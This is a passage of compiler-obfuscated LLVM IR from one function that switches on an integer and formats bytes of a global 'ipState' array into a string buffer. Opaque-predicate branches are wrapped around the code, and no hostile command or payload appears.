  %495 = call i32 (i8*, i8*, ...) @szprintf(i8* %490, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.210, i32 0, i32 0), i32 %492, i32 %494)
  br label %496

; <label>:496:                                    ; preds = %489, %originalBBpart256
  %497 = load i32, i32* %1, align 4
  %498 = icmp eq i32 %497, 24
  br i1 %498, label %499, label %506

; <label>:499:                                    ; preds = %496
  %500 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %501 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %502 = zext i8 %501 to i32
  %503 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %504 = zext i8 %503 to i32
  %505 = call i32 (i8*, i8*, ...) @szprintf(i8* %500, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.211, i32 0, i32 0), i32 %502, i32 %504)
  br label %506

; <label>:506:                                    ; preds = %499, %496
  %507 = load i32, i32* %1, align 4
  %508 = icmp eq i32 %507, 25
  br i1 %508, label %509, label %516

; <label>:509:                                    ; preds = %506
  %510 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %511 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %512 = zext i8 %511 to i32
  %513 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %514 = zext i8 %513 to i32
  %515 = call i32 (i8*, i8*, ...) @szprintf(i8* %510, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.212, i32 0, i32 0), i32 %512, i32 %514)
  br label %516

; <label>:516:                                    ; preds = %509, %506
  %517 = load i32, i32* @x.77
  %518 = load i32, i32* @y.78
  %519 = sub i32 %517, 1
  %520 = mul i32 %517, %519
  %521 = urem i32 %520, 2
  %522 = icmp eq i32 %521, 0
  %523 = icmp slt i32 %518, 10
  %524 = or i1 %522, %523
  br i1 %524, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %516
  %525 = load i32, i32* %1, align 4
  %526 = icmp eq i32 %525, 26
  %527 = load i32, i32* @x.77
  %528 = load i32, i32* @y.78
  %529 = sub i32 %527, 1
  %530 = mul i32 %527, %529
  %531 = urem i32 %530, 2
  %532 = icmp eq i32 %531, 0
  %533 = icmp slt i32 %528, 10
  %534 = or i1 %532, %533
  br i1 %534, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %526, label %535, label %542

; <label>:535:                                    ; preds = %originalBBpart260
  %536 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %537 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %538 = zext i8 %537 to i32
  %539 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %540 = zext i8 %539 to i32
  %541 = call i32 (i8*, i8*, ...) @szprintf(i8* %536, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.213, i32 0, i32 0), i32 %538, i32 %540)
  br label %542

; <label>:542:                                    ; preds = %535, %originalBBpart260
  %543 = load i32, i32* @x.77
  %544 = load i32, i32* @y.78
  %545 = sub i32 %543, 1
  %546 = mul i32 %543, %545
  %547 = urem i32 %546, 2
  %548 = icmp eq i32 %547, 0
  %549 = icmp slt i32 %544, 10
  %550 = or i1 %548, %549
  br i1 %550, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %542
  %551 = load i32, i32* %1, align 4
  %552 = icmp eq i32 %551, 27
  %553 = load i32, i32* @x.77
  %554 = load i32, i32* @y.78
  %555 = sub i32 %553, 1
  %556 = mul i32 %553, %555
  %557 = urem i32 %556, 2
  %558 = icmp eq i32 %557, 0
  %559 = icmp slt i32 %554, 10
  %560 = or i1 %558, %559
  br i1 %560, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %552, label %561, label %568

; <label>:561:                                    ; preds = %originalBBpart264
  %562 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %563 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %564 = zext i8 %563 to i32
  %565 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %566 = zext i8 %565 to i32
  %567 = call i32 (i8*, i8*, ...) @szprintf(i8* %562, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.214, i32 0, i32 0), i32 %564, i32 %566)
  br label %568

; <label>:568:                                    ; preds = %561, %originalBBpart264
  %569 = load i32, i32* %1, align 4
  %570 = icmp eq i32 %569, 28
  br i1 %570, label %571, label %594

; <label>:571:                                    ; preds = %568
  %572 = load i32, i32* @x.77
  %573 = load i32, i32* @y.78
  %574 = sub i32 %572, 1
  %575 = mul i32 %572, %574
  %576 = urem i32 %575, 2
  %577 = icmp eq i32 %576, 0
  %578 = icmp slt i32 %573, 10
  %579 = or i1 %577, %578
  br i1 %579, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %571
  %580 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %581 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %582 = zext i8 %581 to i32
  %583 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %584 = zext i8 %583 to i32
  %585 = call i32 (i8*, i8*, ...) @szprintf(i8* %580, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.215, i32 0, i32 0), i32 %582, i32 %584)
  %586 = load i32, i32* @x.77
  %587 = load i32, i32* @y.78
  %588 = sub i32 %586, 1
  %589 = mul i32 %586, %588
  %590 = urem i32 %589, 2
  %591 = icmp eq i32 %590, 0
  %592 = icmp slt i32 %587, 10
  %593 = or i1 %591, %592
  br i1 %593, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %594

; <label>:594:                                    ; preds = %originalBBpart268, %568
  %595 = load i32, i32* %1, align 4
  %596 = icmp eq i32 %595, 29
  br i1 %596, label %597, label %620

; <label>:597:                                    ; preds = %594
  %598 = load i32, i32* @x.77
  %599 = load i32, i32* @y.78
  %600 = sub i32 %598, 1
  %601 = mul i32 %598, %600
  %602 = urem i32 %601, 2
  %603 = icmp eq i32 %602, 0
  %604 = icmp slt i32 %599, 10
  %605 = or i1 %603, %604
  br i1 %605, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %597
  %606 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %607 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %608 = zext i8 %607 to i32
  %609 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %610 = zext i8 %609 to i32
  %611 = call i32 (i8*, i8*, ...) @szprintf(i8* %606, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.216, i32 0, i32 0), i32 %608, i32 %610)
  %612 = load i32, i32* @x.77
  %613 = load i32, i32* @y.78
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %620

; <label>:620:                                    ; preds = %originalBBpart272, %594
  %621 = load i32, i32* %1, align 4
  %622 = icmp eq i32 %621, 30
  br i1 %622, label %623, label %630

; <label>:623:                                    ; preds = %620
  %624 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %625 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %626 = zext i8 %625 to i32
  %627 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %628 = zext i8 %627 to i32
  %629 = call i32 (i8*, i8*, ...) @szprintf(i8* %624, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.217, i32 0, i32 0), i32 %626, i32 %628)
  br label %630

; <label>:630:                                    ; preds = %623, %620
  %631 = load i32, i32* @x.77
  %632 = load i32, i32* @y.78
  %633 = sub i32 %631, 1
  %634 = mul i32 %631, %633
  %635 = urem i32 %634, 2
  %636 = icmp eq i32 %635, 0
  %637 = icmp slt i32 %632, 10
  %638 = or i1 %636, %637
  br i1 %638, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %630
  %639 = load i32, i32* %1, align 4
  %640 = icmp eq i32 %639, 31
  %641 = load i32, i32* @x.77
  %642 = load i32, i32* @y.78
  %643 = sub i32 %641, 1
  %644 = mul i32 %641, %643
  %645 = urem i32 %644, 2
  %646 = icmp eq i32 %645, 0
  %647 = icmp slt i32 %642, 10
  %648 = or i1 %646, %647
  br i1 %648, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %640, label %649, label %672

; <label>:649:                                    ; preds = %originalBBpart276
  %650 = load i32, i32* @x.77
  %651 = load i32, i32* @y.78
  %652 = sub i32 %650, 1
  %653 = mul i32 %650, %652
  %654 = urem i32 %653, 2
  %655 = icmp eq i32 %654, 0
  %656 = icmp slt i32 %651, 10
  %657 = or i1 %655, %656
  br i1 %657, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %649
  %658 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %659 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %660 = zext i8 %659 to i32
  %661 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %662 = zext i8 %661 to i32
  %663 = call i32 (i8*, i8*, ...) @szprintf(i8* %658, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.218, i32 0, i32 0), i32 %660, i32 %662)
  %664 = load i32, i32* @x.77
  %665 = load i32, i32* @y.78
  %666 = sub i32 %664, 1
  %667 = mul i32 %664, %666
  %668 = urem i32 %667, 2
  %669 = icmp eq i32 %668, 0
  %670 = icmp slt i32 %665, 10
  %671 = or i1 %669, %670
  br i1 %671, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %672

; <label>:672:                                    ; preds = %originalBBpart280, %originalBBpart276
  %673 = load i32, i32* %1, align 4
  %674 = icmp eq i32 %673, 32
  br i1 %674, label %675, label %698

; <label>:675:                                    ; preds = %672
  %676 = load i32, i32* @x.77
  %677 = load i32, i32* @y.78
  %678 = sub i32 %676, 1
  %679 = mul i32 %676, %678
  %680 = urem i32 %679, 2
  %681 = icmp eq i32 %680, 0
  %682 = icmp slt i32 %677, 10
  %683 = or i1 %681, %682
  br i1 %683, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %675
  %684 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %685 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %686 = zext i8 %685 to i32
  %687 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %688 = zext i8 %687 to i32
  %689 = call i32 (i8*, i8*, ...) @szprintf(i8* %684, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.219, i32 0, i32 0), i32 %686, i32 %688)
  %690 = load i32, i32* @x.77
  %691 = load i32, i32* @y.78
  %692 = sub i32 %690, 1
  %693 = mul i32 %690, %692
  %694 = urem i32 %693, 2
  %695 = icmp eq i32 %694, 0
  %696 = icmp slt i32 %691, 10
  %697 = or i1 %695, %696
  br i1 %697, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %698

; <label>:698:                                    ; preds = %originalBBpart284, %672
  %699 = load i32, i32* %1, align 4
  %700 = icmp eq i32 %699, 33
  br i1 %700, label %701, label %708

; <label>:701:                                    ; preds = %698
  %702 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %703 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %704 = zext i8 %703 to i32
  %705 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %706 = zext i8 %705 to i32
  %707 = call i32 (i8*, i8*, ...) @szprintf(i8* %702, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.220, i32 0, i32 0), i32 %704, i32 %706)
  br label %708

; <label>:708:                                    ; preds = %701, %698
  %709 = load i32, i32* @x.77
  %710 = load i32, i32* @y.78
  %711 = sub i32 %709, 1
  %712 = mul i32 %709, %711
  %713 = urem i32 %712, 2
  %714 = icmp eq i32 %713, 0
  %715 = icmp slt i32 %710, 10
  %716 = or i1 %714, %715
  br i1 %716, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %708
  %717 = load i32, i32* %1, align 4
  %718 = icmp eq i32 %717, 34
  %719 = load i32, i32* @x.77
  %720 = load i32, i32* @y.78
  %721 = sub i32 %719, 1
  %722 = mul i32 %719, %721
  %723 = urem i32 %722, 2
  %724 = icmp eq i32 %723, 0
  %725 = icmp slt i32 %720, 10
  %726 = or i1 %724, %725
  br i1 %726, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %718, label %727, label %750

; <label>:727:                                    ; preds = %originalBBpart288
  %728 = load i32, i32* @x.77
  %729 = load i32, i32* @y.78
  %730 = sub i32 %728, 1
  %731 = mul i32 %728, %730
  %732 = urem i32 %731, 2
  %733 = icmp eq i32 %732, 0
  %734 = icmp slt i32 %729, 10
  %735 = or i1 %733, %734
  br i1 %735, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %727
  %736 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %737 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %738 = zext i8 %737 to i32
  %739 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %740 = zext i8 %739 to i32
  %741 = call i32 (i8*, i8*, ...) @szprintf(i8* %736, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.221, i32 0, i32 0), i32 %738, i32 %740)
  %742 = load i32, i32* @x.77
  %743 = load i32, i32* @y.78
  %744 = sub i32 %742, 1
  %745 = mul i32 %742, %744
  %746 = urem i32 %745, 2
  %747 = icmp eq i32 %746, 0
  %748 = icmp slt i32 %743, 10
  %749 = or i1 %747, %748
  br i1 %749, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br label %750

; <label>:750:                                    ; preds = %originalBBpart292, %originalBBpart288
  %751 = load i32, i32* @x.77
  %752 = load i32, i32* @y.78
  %753 = sub i32 %751, 1
  %754 = mul i32 %751, %753
  %755 = urem i32 %754, 2
  %756 = icmp eq i32 %755, 0
  %757 = icmp slt i32 %752, 10
  %758 = or i1 %756, %757
  br i1 %758, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %750
  %759 = load i32, i32* %1, align 4
  %760 = icmp eq i32 %759, 35
  %761 = load i32, i32* @x.77
  %762 = load i32, i32* @y.78
  %763 = sub i32 %761, 1
  %764 = mul i32 %761, %763
  %765 = urem i32 %764, 2
  %766 = icmp eq i32 %765, 0
  %767 = icmp slt i32 %762, 10
  %768 = or i1 %766, %767
  br i1 %768, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %760, label %769, label %776

; <label>:769:                                    ; preds = %originalBBpart296
  %770 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %771 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %772 = zext i8 %771 to i32
  %773 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %774 = zext i8 %773 to i32
  %775 = call i32 (i8*, i8*, ...) @szprintf(i8* %770, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.222, i32 0, i32 0), i32 %772, i32 %774)
  br label %776

; <label>:776:                                    ; preds = %769, %originalBBpart296
  %777 = load i32, i32* %1, align 4
  %778 = icmp eq i32 %777, 36
  br i1 %778, label %779, label %786

; <label>:779:                                    ; preds = %776
  %780 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %781 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %782 = zext i8 %781 to i32
  %783 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %784 = zext i8 %783 to i32
  %785 = call i32 (i8*, i8*, ...) @szprintf(i8* %780, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.201, i32 0, i32 0), i32 %782, i32 %784)
  br label %786

; <label>:786:                                    ; preds = %779, %776
  %787 = load i32, i32* @x.77
  %788 = load i32, i32* @y.78
  %789 = sub i32 %787, 1
  %790 = mul i32 %787, %789
  %791 = urem i32 %790, 2
  %792 = icmp eq i32 %791, 0
  %793 = icmp slt i32 %788, 10
  %794 = or i1 %792, %793
  br i1 %794, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %786
  %795 = load i32, i32* %1, align 4
  %796 = icmp eq i32 %795, 37
  %797 = load i32, i32* @x.77
  %798 = load i32, i32* @y.78
  %799 = sub i32 %797, 1
  %800 = mul i32 %797, %799
  %801 = urem i32 %800, 2
  %802 = icmp eq i32 %801, 0
  %803 = icmp slt i32 %798, 10
  %804 = or i1 %802, %803
  br i1 %804, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %796, label %805, label %812

; <label>:805:                                    ; preds = %originalBBpart2100
  %806 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %807 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %808 = zext i8 %807 to i32
  %809 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %810 = zext i8 %809 to i32
  %811 = call i32 (i8*, i8*, ...) @szprintf(i8* %806, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.223, i32 0, i32 0), i32 %808, i32 %810)
  br label %812

; <label>:812:                                    ; preds = %805, %originalBBpart2100
  %813 = load i32, i32* %1, align 4
  %814 = icmp eq i32 %813, 38
  br i1 %814, label %815, label %822

; <label>:815:                                    ; preds = %812
  %816 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %817 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %818 = zext i8 %817 to i32
  %819 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %820 = zext i8 %819 to i32
  %821 = call i32 (i8*, i8*, ...) @szprintf(i8* %816, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.224, i32 0, i32 0), i32 %818, i32 %820)
  br label %822

; <label>:822:                                    ; preds = %815, %812
  %823 = load i32, i32* @x.77
  %824 = load i32, i32* @y.78
  %825 = sub i32 %823, 1
  %826 = mul i32 %823, %825
  %827 = urem i32 %826, 2
  %828 = icmp eq i32 %827, 0
  %829 = icmp slt i32 %824, 10
  %830 = or i1 %828, %829
  br i1 %830, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %822
  %831 = load i32, i32* %1, align 4
  %832 = icmp eq i32 %831, 39
  %833 = load i32, i32* @x.77
  %834 = load i32, i32* @y.78
  %835 = sub i32 %833, 1
  %836 = mul i32 %833, %835
  %837 = urem i32 %836, 2
  %838 = icmp eq i32 %837, 0
  %839 = icmp slt i32 %834, 10
  %840 = or i1 %838, %839
  br i1 %840, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %832, label %841, label %848

; <label>:841:                                    ; preds = %originalBBpart2104
  %842 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %843 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %844 = zext i8 %843 to i32
  %845 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %846 = zext i8 %845 to i32
  %847 = call i32 (i8*, i8*, ...) @szprintf(i8* %842, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.225, i32 0, i32 0), i32 %844, i32 %846)
  br label %848

; <label>:848:                                    ; preds = %841, %originalBBpart2104
  %849 = load i32, i32* %1, align 4
  %850 = icmp eq i32 %849, 40
  br i1 %850, label %851, label %858

; <label>:851:                                    ; preds = %848
  %852 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %853 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %854 = zext i8 %853 to i32
  %855 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %856 = zext i8 %855 to i32
  %857 = call i32 (i8*, i8*, ...) @szprintf(i8* %852, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.226, i32 0, i32 0), i32 %854, i32 %856)
  br label %858

; <label>:858:                                    ; preds = %851, %848
  %859 = load i32, i32* @x.77
  %860 = load i32, i32* @y.78
  %861 = sub i32 %859, 1
  %862 = mul i32 %859, %861
  %863 = urem i32 %862, 2
  %864 = icmp eq i32 %863, 0
  %865 = icmp slt i32 %860, 10
  %866 = or i1 %864, %865
  br i1 %866, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %858
  %867 = load i32, i32* %1, align 4
  %868 = icmp eq i32 %867, 41
  %869 = load i32, i32* @x.77
  %870 = load i32, i32* @y.78
  %871 = sub i32 %869, 1
  %872 = mul i32 %869, %871
  %873 = urem i32 %872, 2
  %874 = icmp eq i32 %873, 0
  %875 = icmp slt i32 %870, 10
  %876 = or i1 %874, %875
  br i1 %876, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %868, label %877, label %884

; <label>:877:                                    ; preds = %originalBBpart2108
  %878 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %879 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %880 = zext i8 %879 to i32
  %881 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %882 = zext i8 %881 to i32
  %883 = call i32 (i8*, i8*, ...) @szprintf(i8* %878, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.227, i32 0, i32 0), i32 %880, i32 %882)
  br label %884

; <label>:884:                                    ; preds = %877, %originalBBpart2108
  %885 = load i32, i32* %1, align 4
  %886 = icmp eq i32 %885, 42
  br i1 %886, label %887, label %894

; <label>:887:                                    ; preds = %884
  %888 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %889 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %890 = zext i8 %889 to i32
  %891 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %892 = zext i8 %891 to i32
  %893 = call i32 (i8*, i8*, ...) @szprintf(i8* %888, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.228, i32 0, i32 0), i32 %890, i32 %892)
  br label %894

; <label>:894:                                    ; preds = %887, %884
  %895 = load i32, i32* %1, align 4
  %896 = icmp eq i32 %895, 43
  br i1 %896, label %897, label %904

; <label>:897:                                    ; preds = %894
  %898 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %899 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %900 = zext i8 %899 to i32
  %901 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %902 = zext i8 %901 to i32
  %903 = call i32 (i8*, i8*, ...) @szprintf(i8* %898, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.229, i32 0, i32 0), i32 %900, i32 %902)
  br label %904

; <label>:904:                                    ; preds = %897, %894
  %905 = load i32, i32* %1, align 4
  %906 = icmp eq i32 %905, 44
  br i1 %906, label %907, label %914

; <label>:907:                                    ; preds = %904
  %908 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %909 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %910 = zext i8 %909 to i32
  %911 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %912 = zext i8 %911 to i32
  %913 = call i32 (i8*, i8*, ...) @szprintf(i8* %908, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.230, i32 0, i32 0), i32 %910, i32 %912)
  br label %914

; <label>:914:                                    ; preds = %907, %904
  %915 = load i32, i32* %1, align 4
  %916 = icmp eq i32 %915, 45
  br i1 %916, label %917, label %924

; <label>:917:                                    ; preds = %914
  %918 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %919 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %920 = zext i8 %919 to i32
  %921 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %922 = zext i8 %921 to i32
  %923 = call i32 (i8*, i8*, ...) @szprintf(i8* %918, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.231, i32 0, i32 0), i32 %920, i32 %922)
  br label %924

; <label>:924:                                    ; preds = %917, %914
  %925 = load i32, i32* %1, align 4
  %926 = icmp eq i32 %925, 46
  br i1 %926, label %927, label %934

; <label>:927:                                    ; preds = %924
  %928 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %929 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %930 = zext i8 %929 to i32
  %931 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %932 = zext i8 %931 to i32
  %933 = call i32 (i8*, i8*, ...) @szprintf(i8* %928, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.232, i32 0, i32 0), i32 %930, i32 %932)
  br label %934

; <label>:934:                                    ; preds = %927, %924
  %935 = load i32, i32* %1, align 4
  %936 = icmp eq i32 %935, 47
  br i1 %936, label %937, label %944

; <label>:937:                                    ; preds = %934
  %938 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %939 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %940 = zext i8 %939 to i32
  %941 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %942 = zext i8 %941 to i32
  %943 = call i32 (i8*, i8*, ...) @szprintf(i8* %938, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.233, i32 0, i32 0), i32 %940, i32 %942)
  br label %944

; <label>:944:                                    ; preds = %937, %934
  %945 = load i32, i32* %1, align 4
  %946 = icmp eq i32 %945, 48
  br i1 %946, label %947, label %954

; <label>:947:                                    ; preds = %944
  %948 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %949 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %950 = zext i8 %949 to i32
  %951 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %952 = zext i8 %951 to i32
  %953 = call i32 (i8*, i8*, ...) @szprintf(i8* %948, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.234, i32 0, i32 0), i32 %950, i32 %952)
  br label %954

; <label>:954:                                    ; preds = %947, %944
  %955 = load i32, i32* @x.77
  %956 = load i32, i32* @y.78
  %957 = sub i32 %955, 1
  %958 = mul i32 %955, %957
  %959 = urem i32 %958, 2
  %960 = icmp eq i32 %959, 0
  %961 = icmp slt i32 %956, 10
  %962 = or i1 %960, %961
  br i1 %962, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %954
  %963 = load i32, i32* %1, align 4
  %964 = icmp eq i32 %963, 49
  %965 = load i32, i32* @x.77
  %966 = load i32, i32* @y.78
  %967 = sub i32 %965, 1
  %968 = mul i32 %965, %967
  %969 = urem i32 %968, 2
  %970 = icmp eq i32 %969, 0
  %971 = icmp slt i32 %966, 10
